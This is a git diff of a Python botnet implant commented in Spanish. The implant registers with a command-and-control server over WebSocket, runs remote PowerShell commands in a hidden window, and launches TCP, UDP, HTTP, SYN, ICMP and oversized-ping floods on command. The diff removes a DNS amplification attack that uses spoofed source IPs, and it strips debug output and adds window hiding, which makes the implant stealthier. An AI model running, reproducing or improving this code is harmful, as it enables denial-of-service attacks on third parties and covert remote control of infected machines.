@@ -1,4 +1,5 @@
 import asyncio
+import ctypes
 import json
 import subprocess
 import signal
@@ -12,7 +13,6 @@ import time
 from websockets import connect
 from websockets.exceptions import ConnectionClosedError
 from typing import List, Dict, Tuple, Optional
-<<<<<<< HEAD
 
 import requests
 
@@ -20,11 +20,6 @@ import requests
     ctypes.windll.kernel32.FreeConsole()
  """
 
-=======
-from scapy.all import IP, UDP, DNS, DNSQR, send, Raw
-import requests
-
->>>>>>> parent of 0562887 (C# Malware)
 class Impl:
     def __init__(self, c2_ws_url: str, group: str = "grupo1"):
         self.c2_ws_url = c2_ws_url
@@ -46,23 +41,14 @@ class Impl:
             try:
                 await self._connect_to_c2()
             except Exception as e:
-<<<<<<< HEAD
                 
-=======
-                print(f"Error de conexión: {e}, reintentando en 5 segundos...")
->>>>>>> parent of 0562887 (C# Malware)
                 await asyncio.sleep(5)
     
     async def _connect_to_c2(self) -> None:
         """Establece conexión WebSocket con el C2"""
         async with connect(f"{self.c2_ws_url}?id={self.impl_id}") as ws:
-<<<<<<< HEAD
             
             
-=======
-            print(ws)
-            print(f"[+] Conectado a C2 en {self.c2_ws_url}")
->>>>>>> parent of 0562887 (C# Malware)
             while self.running:
                 await self._handle_commands(ws)
     
@@ -84,23 +70,12 @@ class Impl:
             elif 'attack' in data:
                 await self._handle_attack_command(ws, data)
             elif 'stop_attack' in data:
-<<<<<<< HEAD
                 
                 await self._stop_attack(ws, data['stop_attack'])
         
         except ConnectionClosedError:
             pass
         except Exception as e:
-=======
-                print(data['stop_attack'])
-                await self._stop_attack(ws, data['stop_attack'])
-        
-        except ConnectionClosedError:
-            print("[-] Conexión cerrada por el servidor")
-            raise
-        except Exception as e:
-            print(f"[-] Error procesando comando: {e}")
->>>>>>> parent of 0562887 (C# Malware)
             await ws.send(json.dumps({"error": str(e)}))
     
     async def _execute_command(self, ws, command: str) -> None:
@@ -144,7 +119,8 @@ class Impl:
         result = subprocess.run(
             ['powershell.exe', '-Command', f'Set-Location "{self.current_dir}"; {escaped_cmd}'],
             capture_output=True, 
-            text=True
+            text=True,
+            creationflags=subprocess.CREATE_NO_WINDOW
         )
         return result.stdout, result.stderr, self.current_dir
     
@@ -281,14 +257,8 @@ class Impl:
             }))
         else:
             for attack in self.attacks:
-<<<<<<< HEAD
                 if attack_type == attack['type']:
                     next
-=======
-                print("loop")
-                if attack_type == attack['type']:
-                    print(f"already running {attack_type} {attack['type']}")
->>>>>>> parent of 0562887 (C# Malware)
                 else:
                     loop = asyncio.get_event_loop()
                     
@@ -328,19 +298,10 @@ class Impl:
                 self._syn_flood_attack(target, end_time, stop_thread)
             elif attack_type == "icmp_flood":
                 self._icmp_flood_attack(target, end_time, stop_thread)
-<<<<<<< HEAD
             else:
                 next
         except Exception as e:
             next
-=======
-            elif attack_type == "dns_amplification":
-                self._dns_amplification_attack(target, end_time, stop_thread)
-            else:
-                print(f"[!] Tipo de ataque no reconocido: {attack_type}")
-        except Exception as e:
-            print(f"[!] Error en el ataque: {e}")
->>>>>>> parent of 0562887 (C# Malware)
         finally:
             asyncio.run_coroutine_threadsafe(
                 self._notify_attack_completed(ws, attack_type, target),
@@ -359,11 +320,7 @@ class Impl:
                 "message": "Ataque completado"
             }))
         except Exception as e:
-<<<<<<< HEAD
             next
-=======
-            print(f"[!] Error notificando finalización del ataque: {e}")
->>>>>>> parent of 0562887 (C# Malware)
 
 
     
@@ -372,10 +329,6 @@ class Impl:
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         
-<<<<<<< HEAD
-=======
-        print(f"[*] Iniciando tcp Flood a {target}")
->>>>>>> parent of 0562887 (C# Malware)
         while time.time() < end_time and not stop_thread.is_set():
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -392,10 +345,6 @@ class Impl:
         target_ip, target_port = target.split(":")
         target_port = int(target_port)
         
-<<<<<<< HEAD
-=======
-        print(f"[*] Iniciando udp Flood a {target}")
->>>>>>> parent of 0562887 (C# Malware)
         while time.time() < end_time and not stop_thread.is_set():
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -429,10 +378,6 @@ class Impl:
             method='GET'
         )
         
-<<<<<<< HEAD
-=======
-        print(f"[*] Iniciando HTTP Flood a {target}")
->>>>>>> parent of 0562887 (C# Malware)
         
         
         
@@ -446,7 +391,6 @@ class Impl:
                 time.sleep(0.01)
                 
             except urllib.error.URLError as e:
-<<<<<<< HEAD
                 
                 break
             except Exception as e:
@@ -454,15 +398,6 @@ class Impl:
                 time.sleep(1)  
         
         
-=======
-                print(f"[!] Error de URL: {e.reason}")
-                break
-            except Exception as e:
-                print(f"[!] Error: {str(e)}")
-                time.sleep(1)  # Esperar antes de reintentar
-        
-        print("[*] Ataque HTTP Flood finalizado")
->>>>>>> parent of 0562887 (C# Malware)
     
 
     
@@ -524,47 +459,6 @@ class Impl:
                     os.system(f"ping -n 1 -l 65500 {target} > nul")
             except:
                 pass
-<<<<<<< HEAD
-=======
-    
-
-    def _dns_amplification_attack(self, target: str, end_time: float, stop_thread) -> None:
-        """Ataque de amplificación DNS con IP spoofing"""
-        # Lista de servidores DNS abiertos (considera usar una lista más grande)
-        dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"]
-        target_ip = target.split(":")[0]
-        
-        # Dominios con respuestas grandes para mayor amplificación
-        large_domains = [
-            "example.com", 
-            "isc.org", 
-            "ripe.net",
-            "google.com",
-            "microsoft.com"
-        ]
-        
-        while time.time() < end_time and not stop_thread.is_set():
-            try:
-                for dns_server in dns_servers:
-                    # Seleccionar un dominio aleatorio
-                    domain = random.choice(large_domains)
-                    
-                    # Crear paquete DNS con Scapy para mayor control
-                    # Usamos tipo ANY (255) o TXT para respuestas más grandes
-                    dns_query = IP(dst=dns_server, src=target_ip)/UDP(sport=random.randint(1024, 65535), dport=53)/DNS(
-                        rd=1,
-                        qd=DNSQR(qname=domain, qtype="ANY")
-                    )
-                    
-                    # Enviar el paquete con IP falsificada
-                    send(dns_query, verbose=0)
-                    
-                    # Pequeña pausa para evitar saturación local
-                    time.sleep(0.01)
-                    
-            except Exception as e:
-                pass
->>>>>>> parent of 0562887 (C# Malware)
 
 
     def _close_sockets(self, sockets: list) -> None:
@@ -615,16 +509,9 @@ class Impl:
             'impl_id': self.impl_id
         }
  
-<<<<<<< HEAD
         
         req = requests.post(f"http://127.0.0.1:4000/api/impl/new/{model['impl_id']}", data=model)
         
-=======
-        print(f"[+] Implante registrado: {model}")
-        req = requests.post(f"http://localhost:4000/api/impl/new/{model['impl_id']}", data=model)
-
-        print(req)
->>>>>>> parent of 0562887 (C# Malware)
 
     @property
     def impl_id(self) -> str:
@@ -660,17 +547,12 @@ class Impl:
     
     def _def_handler(self, sig, frame) -> None:
         """Manejador de señales para salida limpia"""
-<<<<<<< HEAD
         
-=======
-        print("\n\n[!] Saliendo..\n")
->>>>>>> parent of 0562887 (C# Malware)
         self.running = False
         
         sys.exit(1)
 
 if __name__ == "__main__":
-<<<<<<< HEAD
     try:
         
         C2_WS_URL = "ws://127.0.0.1:4000/api/rcv"
@@ -681,11 +563,3 @@ if __name__ == "__main__":
     except Exception as e:
         next
         
-=======
-    # Configuración del implante
-    C2_WS_URL = "ws://localhost:4000/api/rcv"
-    GROUP_NAME = "grupo1"
-    
-    impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
-    asyncio.run(impl.run())
->>>>>>> parent of 0562887 (C# Malware)
